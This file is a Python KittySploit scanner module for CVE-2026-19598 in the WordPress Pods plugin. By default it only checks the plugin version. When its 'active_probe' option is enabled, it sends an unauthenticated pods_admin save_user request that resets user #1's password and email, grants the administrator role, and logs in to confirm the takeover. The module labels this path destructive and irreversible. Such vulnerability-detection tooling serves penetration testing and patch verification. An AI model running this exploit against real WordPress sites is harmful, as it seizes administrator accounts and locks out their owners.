#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pods <= 3.3.9 unauthenticated pods_admin priv esc (CVE-2026-19598)."""

from __future__ import annotations

import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "pods"
_VULN_HIGH = (3, 3, 9)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Pods CVE-2026-19598 privilege escalation detect",
        "description": (
            "CVE-2026-19598: meta-box-loader JSON path bypasses pods_admin guards; "
            "unauthenticated save_user can reset user #1 password."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-19598",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-19598",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-19598.yaml",
        ],
        "modules": ["exploits/multi/http/pods_cve_2026_19598_privesc"],
        "tags": ["web", "scanner", "wordpress", "pods", "priv-esc", "cve-2026-19598"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals"],
            "chain": {
                "suggested_followups": ["exploits/multi/http/pods_cve_2026_19598_privesc"],
            },
        },
    }

    active_probe = OptBool(
        False,
        "Attempt save_user password change on user ID 1 (destructive)",
        required=False,
    )

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, "/") or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        if not self.active_probe:
            readme = self.http_request(
                method="GET",
                path=f"/wp-content/plugins/{_PLUGIN}/readme.txt",
                allow_redirects=True,
            )
            if not readme or int(readme.status_code) != 200:
                return False
            if version and self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
                self.set_info(
                    severity="high",
                    cve="CVE-2026-19598",
                    reason=f"Pods {version} in vulnerable range; active save_user not attempted",
                    version=version,
                )
                return True
            return False
        password = f"Ks{secrets.token_hex(6)}!"
        email = f"pods{secrets.token_hex(4)}@example.test"
        data = (
            f"action=pods_admin&method=save_user&ID=1&user_pass={password}"
            f"&user_email={email}&role=administrator"
        )
        resp = self.http_request(
            method="POST",
            path="/wp-admin/admin-ajax.php?meta-box-loader=1",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json",
            },
            data=data,
            allow_redirects=True,
        )
        if not resp or int(resp.status_code) != 200:
            return False
        body = (resp.text or "").strip()
        if body not in ("1", "true", '"1"') and len(body) > 8:
            return False
        login = self.http_request(
            method="POST",
            path="/wp-login.php",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=f"log={email}&pwd={password}&wp-submit=Log+In&redirect_to=/wp-admin/",
            allow_redirects=True,
        )
        cookie_ok = login and any(
            "wordpress_logged_in" in str(v).lower()
            for v in (getattr(login, "headers", {}) or {}).values()
        )
        if not cookie_ok:
            self.set_info(
                severity="high",
                cve="CVE-2026-19598",
                reason="pods_admin accepted save_user but login not confirmed",
                version=version or "unknown",
            )
            return True
        self.set_info(
            severity="critical",
            cve="CVE-2026-19598",
            reason="Unauthenticated pods_admin save_user + login confirmed",
            version=version or "unknown",
        )
        return True
